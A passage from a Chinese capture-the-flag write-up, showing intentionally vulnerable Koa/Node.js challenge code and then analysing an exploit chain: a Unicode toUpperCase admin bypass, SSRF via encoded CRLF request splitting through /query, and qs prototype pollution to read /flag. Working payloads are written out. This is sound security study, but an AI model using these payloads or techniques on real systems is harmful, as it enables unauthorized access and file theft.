&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/delete&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Delete the results Successfully!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Nothing to delete!&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toUpperCase&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Staff&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Monitor&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;tmp/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">keys&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hpdoger&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">paths&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//depend on remote server,not real
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">views&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./views&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">CONFIG&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">allowedMethods&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[demo] start-quick is starting at port 3000&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>唔，看起来要比其它的复杂不少，但是核心漏洞点是一样的；简单审一下代码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230457270.png" alt="image-20211206230457270">&lt;/p>
&lt;p>只允许admin用户才可以加载其它的模板&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230620584.png" alt="image-20211206230620584">&lt;/p>
&lt;p>确实是&lt;code>toUpperCase()&lt;/code>的问题，很轻松就用&lt;code>admın&lt;/code>绕过了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231746702.png" alt="image-20211206231746702">&lt;/p>
&lt;p>/request路由下的请求经过&lt;code>CheckUrl&lt;/code>的检查&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231939254.png" alt="image-20211206231939254">&lt;/p>
&lt;p>必须开头是http://127.0.0.1:3000/query，没法绕过，需要SSRF；请求之后会被记录在sandbox的results.txt里面（追加的形式），sandbox根据ip建立&lt;/p>
&lt;p>而恰好/query本身也是一个路由&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206232301967.png" alt="image-20211206232301967">&lt;/p>
&lt;p>并且参数param比较好绕过，我们借助它来完成我们的攻击；接下来找利用点，看到/save路由&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206234720831.png" alt="image-20211206234720831">&lt;/p>
&lt;p>简单的分析写在注释中了，138行用ssrf绕过，146行使用的qs库有&lt;a href="https://security.snyk.io/vuln/npm:qs:20170213">原型链污染&lt;/a>的问题，传参&lt;code>]=switch&lt;/code>即可绕过；154行的判断也需要绕过，原型链污染sandbox下的一个文件为&lt;code>/flag&lt;/code>，再去自定义读到spath中&lt;/p>
&lt;pre tabindex="0">&lt;code>tmp[&amp;#39;__proto__&amp;#39;][&amp;#39;opath&amp;#39;] = &amp;#39;/flag&amp;#39;;
=&amp;gt;
paths.opath = /flag
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:3000
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207020732089.png" alt="image-20211207020732089">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207001654270.png" alt="image-20211207001654270">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207002041861.png" alt="image-20211207002041861">&lt;/p>
&lt;p>当然，用完全unicode编码也是可以的，亲测这个全编码容错率会高一丢丢&lt;/p>
